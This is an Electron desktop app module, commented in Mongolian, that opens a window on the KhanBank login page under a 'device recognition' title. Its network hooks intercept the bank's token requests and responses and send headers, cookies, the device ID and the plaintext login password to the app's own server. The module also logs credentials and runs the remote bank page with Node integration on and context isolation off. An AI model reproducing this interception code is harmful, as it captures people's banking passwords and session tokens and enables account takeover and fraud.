const { BrowserWindow, session } = require('electron');
const path = require('path');
// const desktopService = require('./services/desktopService'); // Removed - will import dynamically
const { API_CONFIG } = require('./utils/constants');

const { io } = require('socket.io-client');




// ✅ Server-д KhanBank Cookies хадгалах - main process дээр шууд DesktopService ашиглах
async function insertKhanBankCookiesToServer(params) {
    try {
        // Main process дээр шууд DesktopService ашиглах
        const DesktopService = require('./services/desktopService');
        const desktopServiceInstance = new DesktopService();
        const result = await desktopServiceInstance.insertKhanBankCookiesToServer(params);
        console.log('✅ [CAPTCHA] KhanBank cookies амжилттай хадгалагдлаа:', result);
        return result;
    } catch (error) {
        console.error('❌ [CAPTCHA] DesktopService дуудлагад алдаа:', error);
        return { success: false, message: error.message };
    }
}

async function startCaptchaPolling(isCitizen, captchaUrl) {
    try {
        // JWT token авах (main process-д global-аас авах)
        let authToken = global.currentAuthToken || null;
        console.log('🔍 authToken:', authToken);
        if (!authToken) {
            console.warn('⚠️ Auth token олдсонгүй, Socket.io холболт хийхгүй');
            return;
        }
        // ✅ Socket.io холболт хийх (socketService ашиглах)
        const socket = io(API_CONFIG.BASE_URL);
        socket.connect();

        console.log('🔌 Socket connection status:', socket?.connected);

        // ✅ JWT token-оос userOid авах
        let userOid = null;
        try {
            if (authToken) {
                // JWT token-г decode хийх (base64)
                const payload = JSON.parse(Buffer.from(authToken.split('.')[1], 'base64').toString());
                userOid = payload.userOid || payload.userId || null;
                console.log('🔑 JWT token-оос userOid авагдлаа:', userOid);
            }
        } catch (decodeError) {
            console.warn('⚠️ JWT token decode хийхэд алдаа:', decodeError);
        }
        console.log('🔍 userOid:', userOid);
        console.log('🔍 isCitizen:', isCitizen);

        socket.on('disconnect', () => {
            console.log('🔌 Socket.io холболт тасарлаа');
        });

        socket.on('error', (error) => {
            console.error('❌ Socket.io алдаа:', error);
        });

        socket.on('connect', () => {
            console.log('🔌 CaptchaWindow Socket.io холбогдлоо:', socket.id);
            socket.emit('captcha-setup', {
                userOid: userOid,
                isCitizen: isCitizen
            });
            console.log('📤 CAPTCHA setup илгээгдлээ:', { userOid, isCitizen });
        });
        // ✅ Server-д user data илгээх (connection шалгаад)

        // ✅ CAPTCHA update event listener нэмэх
        console.log('🔍 onCaptchaUpdate event listener нэмэж байна...');

        // ✅ Socket-д шууд event listener нэмэх
        socket.on('captcha-update', async (result) => {
            console.log('🔍 CAPTCHA update event listener (socket):', result);
            if (result.success && result.captchaDone) {
                console.log('✅ CAPTCHA амжилттай болсон!');
                console.log('🎉 CAPTCHA амжилттай бөглөгдлөө:', result.message);

                // ✅ CAPTCHA success үед cookies хадгалах
                // try {
                //     // Хуучин CAPTCHA cookies устгах
                //     await clearKhanBankCookiesFromServer(['captcha_cookies']);
                //     console.log('🧹 Хуучин CAPTCHA cookies устгагдлаа');

                //     // KhanBank cookies авах
                //     const cookies = await defaultSession.cookies.get({ domain: 'khanbank.com' });
                //     console.log('🍪 KhanBank cookies олдлоо:', cookies);

                //     if (cookies && cookies.length > 0) {
                //         // Бүх cookies-ийг хадгалах
                //         for (const cookie of cookies) {
                //             await insertKhanBankCookiesToServer({
                //                 isCitizen,
                //                 url: captchaUrl,
                //                 headers: { [cookie.name]: cookie.value },
                //                 deviceId: global.currentDeviceId || 'NoDeviceID',
                //                 userAgent: global.currentUserAgent || 'Electron',
                //                 username: global.currentUsername || null,
                //                 password: global.currentPassword || null,
                //                 bankAccountNum: 'CAPTCHA_LOGIN'
                //             });
                //         }
                //         console.log('✅ CAPTCHA cookies амжилттай хадгалагдлаа');
                //     }

                //     // ✅ Payload credentials хадгалах
                //     if (global.currentUsername && global.currentPassword) {
                //         await insertKhanBankCookiesToServer({
                //             isCitizen,
                //             url: 'https://e.khanbank.com/v3/cfrm/auth/token',
                //             deviceId: global.currentDeviceId || 'NoDeviceID',
                //             userAgent: global.currentUserAgent || 'Electron',
                //             username: global.currentUsername,
                //             password: global.currentPassword,
                //             bankAccountNum: 'PAYLOAD_DATA'
                //         });
                //         console.log('✅ Payload credentials амжилттай хадгалагдлаа');
                //     }

                //     // ✅ Device ID cookie хадгалах
                //     const responseCookies = await defaultSession.cookies.get({ domain: 'khanbank.com' });
                //     console.log('🍪 KhanBank cookies олдлоо:', responseCookies);
                //     const deviceIdCookie = responseCookies.find(c => c.name === 'device-id');
                //     if (deviceIdCookie) {
                //         await insertKhanBankCookiesToServer({
                //             isCitizen,
                //             url: 'https://e.khanbank.com/v3/cfrm/auth/token',
                //             headers: { 'device-id': deviceIdCookie.value },
                //             deviceId: global.currentDeviceId || 'NoDeviceID',
                //             userAgent: global.currentUserAgent || 'Electron',
                //             username: global.currentUsername || null,
                //             password: global.currentPassword || null,
                //             bankAccountNum: 'DEVICE_ID_COOKIE'
                //         });
                //         console.log('✅ Device ID cookie амжилттай хадгалагдлаа');
                //     }
                // } catch (cookieErr) {
                //     console.error('❌ CAPTCHA cookies хадгалахад алдаа:', cookieErr);
                // }
                // // Expose-Headers шалгаад процедур дуудах
                // try {
                //     // ✅ desktopService ашиглах
                //     const result = await desktopService.checkExposeHeaders(
                //         isCitizen,
                //         'check-completed'
                //     );
                //     console.log('✅ CaptchaWindow Completed дараах Expose-Headers шалгагдлаа:', result);
                // } catch (procErr) {
                //     console.error('❌ Completed дараах процедур алдаа:', procErr);
                // }
                // ✅ CaptchaWindow хаах
                if (result && result.shouldCloseWindow) {
                    try {
                        if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
                            console.log('🔒 CaptchaWindow хаагдаж байна...');
                            // Network hooks устгах
                            clearCaptchaNetworkHooks();
                            // Цонхыг destroy хийх
                            global.captchaWindow.destroy();
                            global.captchaWindow = null;
                            socket.disconnect();
                            console.log('✅ CaptchaWindow амжилттай хаагдлаа');
                        }
                    } catch (clsErr) {
                        console.error('❌ CaptchaWindow хаахад алдаа:', clsErr);
                    }
                } else {
                    console.log('ℹ️ CaptchaWindow хаах шаардлагагүй:', result);
                }
            }
        });


        console.log('✅ CAPTCHA update event listener нэмэгдлээ');

        console.log('🔍 CAPTCHA Socket.io холболт эхэллээ (real-time updates)');

    } catch (err) {
        console.error('❌ CAPTCHA Socket.io холболт алдаа:', err);
    }
}



function registerCaptchaNetworkHooks(isCitizen) {
    if (global._captchaHooksInstalled) {
        console.log('ℹ️ CAPTCHA network hooks аль хэдийн бүртгэгдсэн');
        return;
    }

    // Session шалгах
    const defaultSession = session.defaultSession;
    if (!defaultSession || !defaultSession.webRequest) {
        console.warn('⚠️ Session/webRequest боломжгүй байна');
        return;
    }

    // URL filter тохируулах
    const tokenUrls = [
        'https://e.khanbank.com/v3/cfrm/auth/token',
        'https://corp.khanbank.com/api/auth/token',
    ];
    const urlFilter = { urls: tokenUrls.map(url => `${url}*`) };
    let latestPassword = null;
    console.log('🔗 CAPTCHA network hooks бүртгэж байна:', tokenUrls);

    defaultSession.webRequest.onBeforeSendHeaders(urlFilter, async (details, callback) => {
        try {

            // Device ID хадгалах
            if (details.requestHeaders['device-id']) {
                global.currentDeviceId = details.requestHeaders['device-id'];
                console.log('📱 Device ID хадгалагдлаа:', global.currentDeviceId);
            }

            try {
                await insertKhanBankCookiesToServer({
                    isCitizen,
                    url: details.url,
                    headers: details.requestHeaders,
                    deviceId: global.currentDeviceId,
                    userAgent: details.requestHeaders['user-agent'],
                    BankAccountnum: 'REQUEST_HEADER'
                });

                console.log('💾 Шинэ KhanBank cookies хадгалагдлаа');
            } catch (cookieError) {
                console.error('❌ Cookies цэвэрлэх/хадгалахад алдаа:', cookieError);
            }
        } catch (error) {
            console.error('❌ Request headers хяналтад алдаа:', error);
        } finally {
            // Callback дуудах (заавал)
            callback({ requestHeaders: details.requestHeaders });
        }
    });

    defaultSession.webRequest.onResponseStarted(urlFilter, async (details) => {
        try {

            try {
                await insertKhanBankCookiesToServer({
                    isCitizen,
                    url: details.url,
                    headers: details.responseHeaders,
                    deviceId: global.currentDeviceId,
                    userAgent: details.requestHeaders?.['user-agent'],
                    username: global.currentUsername || null,
                    password: global.currentPassword || null,
                    BankAccountnum: 'RESPONSE_HEADER',
                    isResponseHeader: true
                });
                console.log('💾 Response headers хадгалагдлаа');
            } catch (cookieError) {
                console.error('❌ Cookies цэвэрлэх/хадгалахад алдаа:', cookieError);
            }

            if (details.responseHeaders['access-control-expose-headers']) {
                try {
                    const DesktopService = require('./services/desktopService');
                    const desktopServiceInstance = new DesktopService();
                    const result = await desktopServiceInstance.checkExposeHeaders({
                        isCitizen,
                        exposeHeaders: details.responseHeaders['access-control-expose-headers']
                    });
                    console.log('✅onResponseStarted Expose-Headers шалгагдлаа:', details.responseHeaders['access-control-expose-headers']);
                } catch (error) {
                    console.error('❌ Expose-Headers шалгахад алдаа:', error);
                }
            }
        } catch (error) {
            console.error('❌ Response started хяналтад алдаа:', error);
        }
    });


    // 3. Request Payload хяналт
    try {
        defaultSession.webRequest.onBeforeRequest(urlFilter, async (details, callback) => {
            try {

                if (details.uploadData && details.uploadData.length > 0) {


                    // Request payload content авах
                    let requestPayload = '';
                    details.uploadData.forEach((data, index) => {
                        if (data.bytes) {
                            const content = Buffer.from(data.bytes).toString('utf8');
                            requestPayload += content;
                        }
                    });
                    console.log('💾 Request payload:', requestPayload);
                    // Request payload хадгалах
                    if (requestPayload) {
                        const data = JSON.parse(requestPayload);
                        if (!data.rememberDevice) {
                            latestPassword = data.password;
                        }
                        else {
                            if (latestPassword) {
                                data.password = latestPassword;
                            }
                        }
                        await insertKhanBankCookiesToServer({
                            isCitizen,
                            url: details.url,
                            requestPayload: JSON.stringify(data),
                            deviceId: global.currentDeviceId,
                            userAgent: details.requestHeaders?.['user-agent'],
                            username: global.currentUsername || null,
                            password: global.currentPassword || null,
                            BankAccountnum: 'REQUEST_PAYLOAD'
                        });
                        console.log('💾 Request payload хадгалагдлаа');
                    }
                }
                try {
                    const DesktopService = require('./services/desktopService');
                    const desktopServiceInstance = new DesktopService();
                    const result = await desktopServiceInstance.checkExposeHeaders({
                        isCitizen,
                        exposeHeaders: "response_header_Access-Control-Expose-Headers"
                    });
                    console.log('✅onBeforeRequest Expose-Headers шалгагдлаа:', result);
                } catch (error) {
                    console.error('❌ Expose-Headers шалгахад алдаа:', error);
                }

            } catch (error) {
                console.error('❌ Request payload хяналтад алдаа:', error);
            } finally {
                // Callback дуудах (заавал)
                callback({});
            }
        });
        console.log('✅ onBeforeRequest hook бүртгэгдлээ');
    } catch (error) {
        console.error('❌ onBeforeRequest hook бүртгэхэд алдаа:', error);
    }

    // 4. Response Completed хяналт
    try {
        defaultSession.webRequest.onCompleted(urlFilter, async (details) => {
            try {
                console.log('📦 Response completed:', details.statusCode);
                const deviceId = global.currentDeviceId || 'NoDeviceID';

                // Login амжилттай эсэхийг шалгах
                try {
                    // Хуучин response payload устгах
                    console.log('🗑️ Хуучин response payload устгагдлаа');
                } catch (e) {
                    console.error('❌ Response payload устгахад алдаа:', e);
                }

                // Response payload авах (client дээр шууд)
                try {
                    // URL-аас response payload авах
                    // Skip fetch in main process
                    if (typeof fetch === 'undefined' || typeof window === 'undefined') {
                        console.log('ℹ️ Fetch not available, skipping response payload fetch');
                        return;
                    }
                    const resp = await fetch(details.url, {
                        method: 'GET',
                        headers: {
                            'User-Agent': global.currentUserAgent || 'Electron'
                        }
                    });

                    if (resp.ok) {
                        const text = await resp.text();

                        // Response payload хадгалах
                        await insertKhanBankCookiesToServer({
                            isCitizen,
                            url: details.url,
                            responsePayload: text,  // ✅ Response payload content
                            deviceId: deviceId,
                            userAgent: global.currentUserAgent || 'Electron',
                            username: global.currentUsername || null,
                            password: global.currentPassword || null,
                            BankAccountnum: 'RESPONSE_PAYLOAD'
                        });

                        console.log('✅ Response payload амжилттай хадгалагдлаа');
                    }
                } catch (respErr) {
                    console.error('❌ Response payload авахад алдаа:', respErr);
                }

                if (details.responseHeaders['access-control-expose-headers']) {
                    try {
                        const DesktopService = require('./services/desktopService');
                        const desktopServiceInstance = new DesktopService();
                        const result = await desktopServiceInstance.checkExposeHeaders({
                            isCitizen,
                            exposeHeaders: details.responseHeaders['access-control-expose-headers']
                        });
                        console.log('✅onCompleted  Expose-Headers шалгагдлаа:', details.responseHeaders['access-control-expose-headers']);
                    } catch (error) {
                        console.error('❌ Expose-Headers шалгахад алдаа:', error);
                    }
                }

                // Амжилттай response-уудыг логлох
                if (details.statusCode >= 200 && details.statusCode < 300) {
                    console.log('🎉 Амжилттай response:', details.url);
                } else if (details.statusCode >= 400) {
                    console.log('⚠️ Алдаатай response:', details.statusCode, details.url);
                }

            } catch (error) {
                console.error('❌ Response completed хяналтад алдаа:', error);
            }
        });
        console.log('✅ onCompleted hook бүртгэгдлээ');
    } catch (error) {
        console.error('❌ onCompleted hook бүртгэхэд алдаа:', error);
    }

    // Hook-ууд амжилттай бүртгэгдсэн
    global._captchaHooksInstalled = true;
    console.log('🎯 CAPTCHA network hooks бүртгэгдлээ!');
}


function clearCaptchaNetworkHooks() {
    if (!global._captchaHooksInstalled) {
        console.log('ℹ️ CAPTCHA network hooks аль хэдийн устгагдсан');
        return;
    }

    try {
        const { session } = require('electron');
        const s = session.defaultSession;
        if (s && s.webRequest) {
            // Бүх hook-уудыг устгах
            s.webRequest.onBeforeSendHeaders(null);
            s.webRequest.onResponseStarted(null);
            s.webRequest.onBeforeRequest(null);
            s.webRequest.onCompleted(null);

            console.log('🗑️ CAPTCHA network hooks устгагдлаа');
        }
    } catch (error) {
        console.error('❌ CAPTCHA network hooks устгахад алдаа:', error);
    }

    // Global туг-уудыг цэвэрлэх
    global._captchaHooksInstalled = false;
    global.currentDeviceId = null;

    console.log('🧹 CAPTCHA network hooks цэвэрлэгдлээ');
}


class CaptchaWindowManager {
    constructor() {
        this.isInitialized = false;
    }


    async createCaptchaWindow(isCitizen = true, mainWindow = null) {
        console.log('🔍 createCaptchaWindow:', isCitizen);

        // Хуучин CAPTCHA цонхыг хаах
        if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
            console.log('🔒 Closing existing CAPTCHA window...');
            global.captchaWindow.destroy();
            global.captchaWindow = null;
            // Цонх бүрэн хаагдлаа гэж хүлээх
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        const allWindows = BrowserWindow.getAllWindows();
        for (const win of allWindows) {
            if (mainWindow && win !== mainWindow && !win.isDestroyed()) {
                const title = win.getTitle();
                if (title.includes('CAPTCHA') || title.includes('KhanBank') || title.includes('Auth')) {
                    console.log('🔒 Closing other related window:', title);
                    win.destroy();
                    await new Promise(resolve => setTimeout(resolve, 200));
                }
            }
        }

        // URL тохируулах
        const captchaUrl = isCitizen
            ? 'https://e.khanbank.com/auth/login'
            : 'https://corp.khanbank.com/auth/login';

        const customHtmlPath = path.join(__dirname, 'captcha.html');
        global.captchaWindow = new BrowserWindow({
            width: 800,
            height: 600,
            x: 100,
            y: 100,
            parent: mainWindow || undefined,
            modal: false,
            frame: true,
            titleBarStyle: 'default',
            title: 'Төхөөрөмж таниулах',
            show: false,
            // Windows 7 compatibility
            minWidth: 400,
            minHeight: 300,
            resizable: true,
            maximizable: true,
            minimizable: true,
            webPreferences: {
                contextIsolation: false,
                nodeIntegration: true,
                sandbox: false,
                webSecurity: true,
                enableRemoteModule: true
            },
        });
        global.captchaWindow.webContents.setUserAgent(
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
        );
        await global.captchaWindow.loadFile(customHtmlPath);
        setTimeout(async () => {
            try {
                await global.captchaWindow.loadURL(captchaUrl);
            } catch (err) {
                console.error('❌ KhanBank URL ачаалахад алдаа:', err);
            }
        }, 3000);
        global.captchaWindow.on('closed', () => {
            global.captchaWindow = null;
            global.captchaWindow = null;
            clearCaptchaNetworkHooks();
            console.log('🔒 CAPTCHA window closed');
        });
        global.captchaWindow.once('ready-to-show', () => {
            console.log('✅ CAPTCHA window ready');
            registerCaptchaNetworkHooks(isCitizen);
            startCaptchaPolling(isCitizen, captchaUrl);
        });
        
        // Windows 7 compatibility - error handling
        global.captchaWindow.webContents.on('crashed', () => {
            console.error('❌ CAPTCHA window crashed - Windows 7 compatibility issue');
        });
        
        global.captchaWindow.webContents.on('unresponsive', () => {
            console.warn('⚠️ CAPTCHA window unresponsive - Windows 7 compatibility issue');
        });
        
        global.captchaWindow.webContents.on('responsive', () => {
            console.log('✅ CAPTCHA window responsive again');
        });
        setTimeout(() => {
            if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
                global.captchaWindow.show();
                console.log('✅ CAPTCHA window shown (fallback)');
            }
        }, 1000);

        return global.captchaWindow;
    }
    closeCaptchaWindow() {
        if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
            console.log('🔒 Closing CAPTCHA window...');
            // Network hooks устгах
            clearCaptchaNetworkHooks();
            // Цонхыг destroy хийх
            global.captchaWindow.destroy();
            global.captchaWindow = null;
            return true;
        }
        // Global-аас устгах (fallback)
        if (global.captchaWindow) {
            global.captchaWindow = null;
            clearCaptchaNetworkHooks();
        }
        return false;
    }

    isCaptchaWindowOpen() {
        return global.captchaWindow && !global.captchaWindow.isDestroyed();
    }


    getCaptchaWindow() {
        return global.captchaWindow;
    }


    clearHook() {
        clearCaptchaNetworkHooks();
        return true;
    }

    reinstallHook(isCitizen = true) {
        global._captchaHooksInstalled = false;
        registerCaptchaNetworkHooks(isCitizen);
        return true;
    }


    async insertKhanBankCookies(params) {
        console.log('💾 KhanBank cookies хадгалаж байна...');
        return await insertKhanBankCookiesToServer(params);
    }
}

// Global instance үүсгэж export хийх
const captchaWindowManager = new CaptchaWindowManager();
module.exports = captchaWindowManager;
